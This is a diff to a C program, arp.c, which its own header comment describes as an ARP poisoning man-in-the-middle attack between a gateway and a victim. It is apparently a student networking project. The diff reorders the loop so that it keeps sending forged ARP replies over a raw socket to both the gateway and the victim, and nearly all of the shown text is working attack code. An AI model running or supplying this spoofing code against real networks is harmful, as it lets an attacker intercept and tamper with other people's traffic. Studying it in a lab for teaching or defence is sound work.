@@ -5,6 +5,13 @@
  *  (at your option) any later version.
  */
 
+/*
+ *  ARP POISONING ATTACK COM MAN-IN-THE-MIDDLE
+ *  Guiherme Korol e Matheus Storck
+ *
+ *  GATEWAY <--> arp.c <--> VITIMA
+ *
+*/
 #include <arpa/inet.h>
 #include <linux/if_packet.h>
 #include <linux/ip.h>
@@ -188,6 +195,40 @@ int main(int argc, char *argv[])
 
   /* Send replies until the end of times*/
   do {
+    /* Sending spoof reply to GATEWAY*/
+    sender_ip[0] = VITIMA_IP0;
+    sender_ip[1] = VITIMA_IP1;
+    sender_ip[2] = VITIMA_IP2;
+    sender_ip[3] = VITIMA_IP3;
+    target_mac[0] = GATEWAY_MAC0;
+    target_mac[1] = GATEWAY_MAC1;
+    target_mac[2] = GATEWAY_MAC2;
+    target_mac[3] = GATEWAY_MAC3;
+    target_mac[4] = GATEWAY_MAC4;
+    target_mac[5] = GATEWAY_MAC5;
+    target_ip[0] = GATEWAY_IP0;
+    target_ip[1] = GATEWAY_IP1;
+    target_ip[2] = GATEWAY_IP2;
+    target_ip[3] = GATEWAY_IP3;
+    eh->ether_dhost[0] = GATEWAY_MAC0;
+    eh->ether_dhost[1] = GATEWAY_MAC1;
+    eh->ether_dhost[2] = GATEWAY_MAC2;
+    eh->ether_dhost[3] = GATEWAY_MAC3;
+    eh->ether_dhost[4] = GATEWAY_MAC4;
+    eh->ether_dhost[5] = GATEWAY_MAC5;
+    socket_address.sll_addr[0] = GATEWAY_MAC0;
+    socket_address.sll_addr[1] = GATEWAY_MAC1;
+    socket_address.sll_addr[2] = GATEWAY_MAC2;
+    socket_address.sll_addr[3] = GATEWAY_MAC3;
+    socket_address.sll_addr[4] = GATEWAY_MAC4;
+    socket_address.sll_addr[5] = GATEWAY_MAC5;
+    fill_arp(arp_payload,2,((uint8_t *)&if_mac.ifr_hwaddr.sa_data),sender_ip,target_mac,target_ip);
+    print_arp(arp_payload);
+    if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
+        printf("Send failed\n");
+
+    sleep(5);
+
       /* Sending spoof reply to VITIMA */
       sender_ip[0]  = GATEWAY_IP0;
       sender_ip[1]  = GATEWAY_IP1;
@@ -221,43 +262,11 @@ int main(int argc, char *argv[])
 
       /* fake_mac if you want to send a non-valid mac address*/
       //fill_arp(arp_payload,2,fake_mac,sender_ip,target_mac,target_ip);
+
       print_arp(arp_payload);
       if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
     	    printf("Send failed\n");
 
-      sleep(2);
-
-      /* Sending spoof reply to GATEWAY*/
-      sender_ip[0] = VITIMA_IP0;
-      sender_ip[1] = VITIMA_IP1;
-      sender_ip[2] = VITIMA_IP2;
-      sender_ip[3] = VITIMA_IP3;
-      target_mac[0] = GATEWAY_MAC0;
-      target_mac[1] = GATEWAY_MAC1;
-      target_mac[2] = GATEWAY_MAC2;
-      target_mac[3] = GATEWAY_MAC3;
-      target_mac[4] = GATEWAY_MAC4;
-      target_mac[5] = GATEWAY_MAC5;
-      target_ip[0] = GATEWAY_IP0;
-      target_ip[1] = GATEWAY_IP1;
-      target_ip[2] = GATEWAY_IP2;
-      target_ip[3] = GATEWAY_IP3;
-      eh->ether_dhost[0] = GATEWAY_MAC0;
-      eh->ether_dhost[1] = GATEWAY_MAC1;
-      eh->ether_dhost[2] = GATEWAY_MAC2;
-      eh->ether_dhost[3] = GATEWAY_MAC3;
-      eh->ether_dhost[4] = GATEWAY_MAC4;
-      eh->ether_dhost[5] = GATEWAY_MAC5;
-      socket_address.sll_addr[0] = GATEWAY_MAC0;
-      socket_address.sll_addr[1] = GATEWAY_MAC1;
-      socket_address.sll_addr[2] = GATEWAY_MAC2;
-      socket_address.sll_addr[3] = GATEWAY_MAC3;
-      socket_address.sll_addr[4] = GATEWAY_MAC4;
-      socket_address.sll_addr[5] = GATEWAY_MAC5;
-      fill_arp(arp_payload,2,((uint8_t *)&if_mac.ifr_hwaddr.sa_data),sender_ip,target_mac,target_ip);
-      print_arp(arp_payload);
-      if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
-    	    printf("Send failed\n");
   } while (1);
 
   return 0;
